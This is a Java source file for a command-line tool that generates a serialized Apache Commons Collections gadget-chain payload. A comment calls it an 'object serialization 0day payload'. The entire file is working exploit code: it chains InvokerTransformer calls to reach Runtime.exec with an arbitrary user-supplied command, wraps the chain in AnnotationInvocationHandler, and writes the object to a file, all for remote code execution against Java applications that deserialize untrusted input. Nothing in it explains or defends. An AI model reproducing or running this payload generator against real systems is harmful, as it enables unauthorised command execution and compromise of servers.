import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * 对象序列化0day payload
 * Created by liaojiacan on 2017/5/8.
 */
public class ReversePayload  {
    public static Object Reverse_Payload(String execArgs) throws Exception {
        final Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[]{execArgs}), new ConstantTransformer(1) };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        Class cls = Class
                .forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void main(String args[]) throws Exception{

        if(args.length != 2){
            System.out.println("java -jar payload.jar outfile cmd");
            System.exit(0);
        }

        String cmd = args[1];
        FileOutputStream out = new FileOutputStream(args[0]);

        Object pwn =  Reverse_Payload(cmd);
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeObject(pwn);
        oos.flush();
        out.flush();


    }
}
